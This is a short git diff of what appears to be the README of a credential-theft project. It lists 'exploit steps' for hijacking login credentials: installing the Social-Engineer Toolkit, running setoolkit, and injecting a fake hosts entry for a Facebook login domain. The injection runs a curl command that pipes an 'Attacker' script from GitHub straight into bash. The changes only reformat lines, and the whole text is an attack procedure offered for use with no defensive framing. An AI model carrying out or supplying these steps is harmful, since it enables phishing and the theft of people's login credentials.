@@ -8,8 +8,7 @@
 
 # Exploit steps:
 1. - Installing requirements
-
-https://github.com/trustedsec/social-engineer-toolkit
+     https://github.com/trustedsec/social-engineer-toolkit
 
 2. - Preparing packages
 For other Linux distro attackers
@@ -24,7 +23,6 @@ setoolkit
 ```
 
 3. - Creating hosts exploit facebook.login.com
-- For Linux
 ```bash
 curl -s https://raw.githubusercontent.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials/master/Attacker/hosts_fake_inject/fakehost.sh | bash
 ```
